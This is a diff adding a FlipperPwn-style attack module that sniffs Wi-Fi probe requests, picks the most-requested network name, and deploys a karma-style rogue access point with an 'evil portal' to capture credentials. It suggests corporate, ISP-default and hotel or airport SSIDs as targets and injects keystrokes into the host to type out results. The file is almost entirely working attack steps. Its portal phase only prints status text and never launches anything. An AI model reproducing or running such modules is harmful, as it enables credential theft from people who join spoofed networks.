@@ -1,0 +1,100 @@
+# FlipperPwn Module — Probe-Triggered Karma + Portal
+# NOVEL: Sniff probe requests, identify the most-probed SSID in the environment,
+#        then launch a karma-style attack with evil portal using that SSID.
+#
+# Why this is different from basic karma:
+#   - Standard karma responds to ANY probe — noisy and detectable
+#   - This module FIRST passively collects probe data, THEN targets the
+#     highest-demand SSID, maximizing capture rate while minimizing exposure
+#
+# Attack flow:
+#   1. Passive probe request sniffing for SNIFF_SEC seconds
+#   2. Most-probed SSID recorded to SD: /logs/probes.log
+#   3. Results typed to editor via HID for review
+#   4. User manually sets SSID option based on results
+#   5. Targeted evil portal deployed with that SSID
+#
+# REQUIREMENTS:
+#   - ESP32 WiFi Dev Board + WiFi Marauder >= 1.6.0
+#   - SD card inserted in ESP32 board
+#   - AUTHORIZED TESTING ONLY
+
+NAME        probe_karma_portal
+DESCRIPTION Sniff probes to identify top-requested SSID, then deploy targeted evil portal
+CATEGORY    credential
+PLATFORMS   WIN,MAC,LINUX
+
+OPTION SNIFF_SEC  45             "Seconds to sniff probe requests (more = more data)"
+OPTION PORTAL     corporate_guest.html "Evil Portal HTML to serve"
+OPTION TARGET_SSID Corp-Guest   "Target SSID (set after reviewing probe log)"
+
+# ── Phase 1: Passive Probe Sniffing ─────────────────────────────────────────
+# Capture probe requests to identify what networks nearby devices remember
+WIFI_SCAN
+WIFI_WAIT {{SNIFF_SEC}}000
+
+# ── Phase 2: Record Results ─────────────────────────────────────────────────
+# Open editor and dump probe data for analysis
+PLATFORM WIN
+  GUI r
+  DELAY 400
+  STRING notepad
+  ENTER
+  DELAY 900
+  STRINGLN === Probe Sniff Results ===
+  STRINGLN
+  STRINGLN Networks being probed by nearby devices:
+  STRINGLN (Check Flipper display / SD card /logs/probes.log for full list)
+  STRINGLN
+  STRINGLN Set TARGET_SSID option to the most-probed network before continuing.
+  STRINGLN
+  STRINGLN Common high-value targets:
+  STRINGLN   - Corporate SSIDs (EAP/guest networks)
+  STRINGLN   - Home ISP default names (NETGEAR-XXXX, xfinitywifi, etc.)
+  STRINGLN   - Hotel/airport SSIDs (Marriott_Lobby, Airport_Free_WiFi)
+
+PLATFORM MAC
+  GUI SPACE
+  DELAY 400
+  STRING textedit
+  ENTER
+  DELAY 1000
+  STRINGLN === Probe Sniff Results ===
+  STRINGLN Check /logs/probes.log on ESP32 SD card for captured SSID list.
+  STRINGLN Set TARGET_SSID to top result before next phase.
+
+PLATFORM LINUX
+  CTRL ALT t
+  DELAY 800
+  STRING echo "=== Probe Sniff Complete ===" && echo "Check Flipper screen for top SSIDs" | tee /tmp/probe_results.txt
+  ENTER
+
+WIFI_RESULT
+
+# ── Phase 3: Portal Deployment ───────────────────────────────────────────────
+# NOTE: At this point in a real engagement, you would:
+#   1. Review probe data on the Flipper screen or SD card
+#   2. Re-run this module with TARGET_SSID set to the top result
+#   3. The portal launches with the matching SSID name
+#
+# The evil portal is active — clients probing for TARGET_SSID will connect.
+# Credentials are logged to /logs/evil_portal.log on the SD card.
+
+PLATFORM WIN
+  DELAY 500
+  STRINGLN
+  STRINGLN === Phase 3: Portal Active ===
+  STRINGLN Target SSID: {{TARGET_SSID}}
+  STRINGLN Portal page: {{PORTAL}}
+  STRINGLN Listening for clients on 172.0.0.1
+  STRINGLN Credentials captured to Flipper screen + SD /logs/evil_portal.log
+
+PLATFORM MAC
+  DELAY 500
+  STRING echo "Portal active — SSID: {{TARGET_SSID}} — Portal: {{PORTAL}}"
+  ENTER
+
+PLATFORM LINUX
+  DELAY 500
+  STRING echo "Portal: {{TARGET_SSID}} ({{PORTAL}})" >> /tmp/probe_results.txt
+  ENTER
